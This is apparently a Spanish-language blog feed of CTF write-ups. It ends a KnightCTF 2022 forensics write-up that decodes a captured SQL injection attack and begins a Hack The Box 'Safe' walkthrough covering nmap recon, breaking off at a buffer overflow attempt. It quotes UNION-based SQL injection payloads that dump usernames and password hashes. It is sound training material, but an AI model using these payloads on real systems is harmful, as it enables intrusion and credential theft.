&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/53.png&quot; alt=&quot;53&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya viendo esto podríamos determinar el tipo de ataque que se realizó, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL Injection&lt;/code&gt;, no obstante, al verse &lt;em&gt;url encodeado&lt;/em&gt;, puede resultar un poco complicado leer la petición.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{sql_injection}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;vuln-columns&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Vuln Columns&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para visualizar de mejor manera las &lt;em&gt;inyecciones SQL&lt;/em&gt; que se realizaron, podemos exportar los objetos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/48.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si observamos detenidamente, nos daremos cuenta que el atacante empieza a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ordenar&lt;/code&gt; las columnas de la base de datos de manera consecutiva, con el objetivo de conocer el total de columnas existentes.&lt;/p&gt;

&lt;p&gt;Este proceso lo realiza un total de &lt;em&gt;diez veces&lt;/em&gt;, en el primer intento hay un pequeño fallo de sintaxis por lo que lo descartamos, y a partir del segundo intento, empieza a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ordenar&lt;/code&gt; las columnas, una a una, esto lo hace hasta la columna &lt;em&gt;nueve&lt;/em&gt;, la cual no existe, razón por la cual, en el décimo intento, vuelve a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ordenar&lt;/code&gt; las columnas hasta la número &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ocho&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; order by 1,2,3,4,5,6,7,8 --+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sabidas el número total de columnas de la base de datos, el atacante empieza a determinar cuales son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnerables&lt;/code&gt;, esto lo hace a través del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;, con el cual empieza a reemplazar ciertas columnas por otra serie de &lt;em&gt;comandos&lt;/em&gt; que le otorgan &lt;em&gt;información relevante&lt;/em&gt; de la base de datos.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,3,4,5,6,7,8 --+
users.php?id=1&apos; union select 1,2,version(),4,5,6,7,8 --+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez analizadas las columnas que el atacante utiliza, podemos determinar que son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cuatro&lt;/code&gt;, las columnas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnerables&lt;/code&gt;; concretamente, las columnas &lt;em&gt;3&lt;/em&gt;, &lt;em&gt;6&lt;/em&gt;, &lt;em&gt;7&lt;/em&gt; y &lt;em&gt;8&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{4}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;hashed-password&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Hashed Password&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/56.png&quot; alt=&quot;56&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para este reto se nos pregunta por el hash de la contraseña del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tareq&lt;/code&gt;, la cual el atacante consiguió haciendo uso de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyecciones SQL&lt;/code&gt;, concretamente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/57.png&quot; alt=&quot;57&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;database-flag&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Database Flag&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/58.png&quot; alt=&quot;58&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al igual que el reto anterior, se pude asumir que el atacante a través de las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyecciones SQL&lt;/code&gt;, logró filtrar información relevante de la plataforma de CTF, en este caso una &lt;em&gt;flag&lt;/em&gt;; la &lt;em&gt;inyección&lt;/em&gt; en cuestión es:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,3,4,5,6,group_concat(flag),8 from vulnerable --+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/59.png&quot; alt=&quot;59&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Conseguimos filtrar dos cadenas encriptadas en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;S0NURntTcUw=
XzFOajNDN2kwbn0=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Al &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64(&apos;A-Za-z0-9%2B/%3D&apos;,true)&quot;&gt;desencriptarlas&lt;/a&gt; conseguiremos la flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{SqL_1Nj3C7i0n}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;attacker&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Attacker&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/60.png&quot; alt=&quot;60&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente, parece ser que el atacante decidió ‘firmar’ el ataque, dejando su nombre en la última &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inyección SQL&lt;/code&gt;, donde deja un mensaje encriptado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexadecimal&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;users.php?id=1&apos; union select 1,2,0x4861636b6564204279204d4f5348,4,5,6,group_concat(flag),8 from vulnerable --+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No obstante, si no queremos &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Hex(&apos;None&apos;)&quot;&gt;desencriptar&lt;/a&gt; el mensaje, podemos verlo en texto plano desde el propio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/61.png&quot; alt=&quot;61&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 17 Jan 2022 00:00:00 -0500</pubDate>
        <link>/es/KnightCTF-2022/</link>
        <guid isPermaLink="true">/es/KnightCTF-2022/</guid>
      </item>
    
      <item>
        <title>Safe - Hack The Box</title>
        <description>&lt;p&gt;El día de hoy vamos a estar resolviendo la máquina &lt;em&gt;Safe&lt;/em&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;. Es una máquina &lt;em&gt;Linux&lt;/em&gt; de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/1.png&quot; alt=&quot;User Rated Difficulty&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;

&lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.147
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Linux&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.147 -R                               
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.147
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.147
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,80,1337 10.10.10.147
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;; asimismo, encontramos abierto el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1337&lt;/code&gt;, relacionado con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WASTE&lt;/code&gt;, el cual permite el intercambio de archivos de forma cifrada.&lt;/p&gt;

&lt;p&gt;Debido a que la máquina cuenta con el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; abierto, podríamos intentar aplicar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuzzing&lt;/code&gt;, no obstante, no vamos a encontrar nada interesante.&lt;/p&gt;

&lt;p&gt;Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.147
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web.&lt;/p&gt;

&lt;p&gt;En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + U&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, alojado en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1337&lt;/code&gt;, lo podemos descargar; para ello, podemos intentar añadir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/myapp&lt;/code&gt;, al final del url.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Los comentarios en HTML, siempre tienen la siguiente estructura:&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Este es un comentario a modo de prueba --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al añadir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/myapp&lt;/code&gt;, al final del url, se nos va a descargar un archivo que lleva por nombre, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, el cual vamos a empezar a analizar.&lt;/p&gt;

&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;

&lt;p&gt;Lo primero que debemos hacer, es saber que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, para ello podemos usar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file myapp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos damos cuenta de que el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 744 myapp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al ejecutar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt;, sin embargo, no hay nada interesante.&lt;/p&gt;

&lt;p&gt;Lo siguiente que podríamos intentar, sería realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;, para ello, cuándo el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga.&lt;/p&gt;

&lt;p&gt;Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;.&lt;/p&gt;

